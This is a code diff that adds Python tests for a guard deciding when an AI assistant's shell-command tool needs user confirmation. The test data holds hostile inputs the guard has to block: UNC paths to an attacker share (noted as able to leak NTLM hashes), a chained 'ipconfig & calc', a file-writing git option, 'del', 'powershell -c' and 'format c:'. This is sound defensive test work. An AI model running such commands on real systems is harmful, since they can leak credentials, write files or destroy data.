@@ -59,6 +59,36 @@ def test_extra_adds_and_skip_removes_except_the_three_that_always_ask(monkeypatc
     assert jarvis_guard.effective_risk("lookup_sim_data", "low") == "low"
 
 
+def test_a_read_only_run_cmd_call_keeps_low_only_when_the_guard_agrees(monkeypatch):
+    """K-45 v22 (X-31): run_cmd_command's own READ_ONLY rating counts, but never for a UNC path, a token with '='
+    or a shell metacharacter, and never without the call's arguments."""
+    assert jarvis_guard.effective_risk("run_cmd_command", "low", {"command": "ipconfig /all"}) == "low"
+    assert jarvis_guard.effective_risk("run_cmd_command", "low", {"command": "git status"}) == "low"
+    for command in ("dir \\\\attacker\\share", "where //host/share", "git diff --output=C:\\x.txt",
+                    "ipconfig & calc", "ping \"x y\"", "", "  ", "del x", "powershell -c x", "git push",
+                    "git", "python script.py", "node -e x"):
+        assert jarvis_guard.effective_risk("run_cmd_command", "low", {"command": command}) == "high", command
+    assert jarvis_guard.effective_risk("run_cmd_command", "low") == "high"  # no arguments, no exception
+    assert jarvis_guard.effective_risk("run_cmd_command", "high", {"command": "ipconfig"}) == "high"
+    assert jarvis_guard.effective_risk("shutdown_system", "low", {"command": "ipconfig"}) == "high"  # not dynamic
+    monkeypatch.setenv(jarvis_guard.SKIP_ENV, "run_cmd_command")  # NEVER_SKIP still holds for the rest
+    assert jarvis_guard.effective_risk("run_cmd_command", "low", {"command": "del x"}) == "high"
+
+
+def test_the_guard_stops_what_a_looser_allow_list_would_let_through():
+    """With X-31's real risk callable: its allow-list rates these 'low', the guard keeps them HIGH."""
+    from services.automation.jarvis_notepad_automation import _run_cmd_risk
+
+    def asked_at(command: str) -> str:
+        arguments = {"command": command}
+        return jarvis_guard.effective_risk("run_cmd_command", _run_cmd_risk(arguments), arguments)
+
+    assert asked_at("ipconfig") == "low" and asked_at("git log --oneline") == "low"
+    assert asked_at("dir \\\\attacker.example\\share") == "high"  # an SMB login could leak the NTLM hash
+    assert asked_at("git diff --output=C:\\Users\\x.bat") == "high"  # writes a file
+    assert asked_at("del C:\\x") == "high" and asked_at("powershell -c x") == "high"
+
+
 def test_medium_tools_are_audited_as_medium_without_being_asked():
     assert jarvis_guard.audit_risk("type_text_tool", "low") == "medium"
     assert jarvis_guard.audit_risk("create_folder", "low") == "medium"
@@ -137,3 +167,24 @@ async def test_an_unlisted_low_tool_is_unchanged(monkeypatch):
 
     result = await _call_like_livekit("c29_plain", {"value": "v"})
     assert result["status"] == "success" and not asked and audits == []
+
+
+async def test_the_wrapper_hands_each_calls_arguments_to_the_guard(monkeypatch):
+    """K-45 v22: a stand-in for run_cmd_command (a HIGH tool with a per-call risk callable) runs its READ_ONLY call
+    without a question and asks for everything else."""
+    monkeypatch.setenv(jarvis_guard.EXTRA_ENV, "x31_dynamic_tool")
+    monkeypatch.setattr(jarvis_guard, "DYNAMIC_FLOOR", frozenset({"x31_dynamic_tool"}))
+    seen: list[dict[str, Any]] = []
+    monkeypatch.setattr(jarvis_guard, "_read_only_call_ok", lambda _tool, arguments: (
+        seen.append(dict(arguments)) or arguments.get("command") == "ipconfig"))
+    asked = _fake_broker(monkeypatch)
+
+    @jarvis_tool(risk=lambda arguments: "low" if arguments.get("command") == "ipconfig" else "high")
+    async def x31_dynamic_tool(command: str) -> dict:
+        """A stand-in for run_cmd_command."""
+        return {"status": "success", "command": command}
+
+    result = await _call_like_livekit("x31_dynamic_tool", {"command": "ipconfig"})
+    assert result["status"] == "success" and not asked and seen == [{"command": "ipconfig"}]
+    result = await _call_like_livekit("x31_dynamic_tool", {"command": "format c:"})
+    assert result["status"] == "needs_confirmation" and asked["risk"] == "high"
